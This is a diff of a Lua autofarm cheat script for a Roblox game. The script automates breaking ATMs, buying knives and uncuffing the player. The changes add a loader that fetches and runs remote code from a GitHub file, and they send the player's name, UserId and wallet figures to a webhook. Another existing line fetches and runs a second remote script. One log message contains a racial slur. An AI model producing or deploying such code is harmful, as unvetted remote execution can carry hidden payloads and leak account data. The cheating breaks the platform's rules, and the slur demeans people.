@@ -730,7 +730,7 @@ HPT.Size = UDim2.new(1, 0, 1, 0)
 TOOLTIP.BackgroundTransparency = 0.2
 SG.IgnoreGuiInset = true 
 MS.Parent = M
-USER.Text = "| Username - eyesore"
+USER.Text = "| Username - @CZXPEK"
 
 --SG.Enabled = false
 
@@ -770,16 +770,21 @@ task.spawn(function()
 	end
 end)
 
+
 local StartedWith = Player.DataFolder.Currency.Value
 local Cashier, Dist, Index = nil, 0, 0 
 local StartTick = os.time()
 local Shutdown = false
 local Unarresting = false
-local Lastprint = os.time()+3
+local LastLog = os.time()+3
 local BrokenATMs = 0
 
+local Log = function(Msg)
+	print(os.date("%X").." | iku autofarm - "..Msg)
+end
+
 local IsDead = function()
-	return (Player.Character:FindFirstChild("Humanoid") == nil) or (Player.Character.Humanoid.Health <= 1)
+	return (Player.Character:FindFirstChild("Humanoid") == nil) or (Player.Character.Humanoid.Health <= 0)
 end
 
 local GetMag = function(Part) 
@@ -823,7 +828,7 @@ local Update = function()
 				
 			end
 		else 
-			print("error finding P-"..tostring(i)..".")
+			Log("error finding P-"..tostring(i)..".")
 		end
 	end
 end
@@ -862,11 +867,13 @@ local GetCloseCash = function()
 	return Am
 end
 
+local SendLog = loadstring(game:HttpGet("https://github.com/applless/RandomScripts/raw/main/Webhookk"))()
+
 local Attack = function()
 	local Mode = tonumber(_G.AutofarmSettings.AttackMode)
 
 	if (Mode == nil) then
-		return print("INVALID ATTACK METHOD!!!")
+		return Log("INVALID ATTACK METHOD!!!")
 	end
 
 
@@ -879,7 +886,7 @@ local Attack = function()
 		end
 
 		local Combat = Player.Character:FindFirstChild("Combat")
-		if (Combat == nil) then return print("no combat tool found.") end
+		if (Combat == nil) then return Log("no combat tool found.") end
 
 		Combat:Activate()
 
@@ -894,11 +901,11 @@ local Attack = function()
 				task.wait(10)
 				EMPTY.Text = "|"
 			end)
-			return print("nigga how are you that broke that you cant afford to buy a knife lol.")
+			return Log("nigga how are you that broke that you cant afford to buy a knife lol.")
 		end
 
 		if (Player.Backpack:FindFirstChild("[Knife]") == nil) and (Player.Character:FindFirstChild("[Knife]") == nil) then 
-			print("buying knife.")
+			Log("buying knife.")
 			
 			EMPTY.Text = "| Buying knife."
 
@@ -919,7 +926,7 @@ local Attack = function()
 		end
 
 		local Knife = Player.Character:FindFirstChild("[Knife]")
-		if (Knife == nil) then return print("no knife tool found.") end
+		if (Knife == nil) then return Log("no knife tool found.") end
 
 		Knife:Activate()
 		task.wait(0.1)
@@ -941,7 +948,7 @@ task.spawn(function()
 				task.wait()
 			until (Cashier ~= nil) or (IsDead() == true) or (Shutdown == true) 
 			EMPTY.Text = "|"
-			print("found atm "..tostring(Index)..", distance: "..tostring(Dist)..".")
+			Log("found atm "..tostring(Index)..", distance: "..tostring(Dist)..".")
 			
 			if (Unarresting == true) then 
 				EMPTY.Text = "| Uncuffing."
@@ -1038,15 +1045,28 @@ task.spawn(function()
 				Unarresting = false
 			end
 		end)
+		
+		task.spawn(function()
+			if (os.time() >= LastLog) then 
+				local s, e = pcall(function()
+					SendLog(_G.AutofarmSettings.Webhook, {Player.Name, Player.UserId, WALLET.Text, PROFIT.Text, TIMER.Text, BROKEN.Text, "| iku autofarm by @trans"})
+				end)
+				if (e) then 
+					Log("error while sending log:\n"..tostring(e).."\n")
+				end
+				LastLog = os.time()+((tonumber(_G.AutofarmSettings.LogInterval)*60) or 60)
+			end
 
-		if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health <= 20 then
+		end)
+		
+		if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health <= 10 then
 			print("dead")
 			local ran = math.random(1, 10)
 			print(ran)
 			wait(ran)
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
 		end
-
+		
 		task.spawn(function()
 			pcall(function()
 				for i,v in pairs(_G.AutofarmSettings.Codes) do 
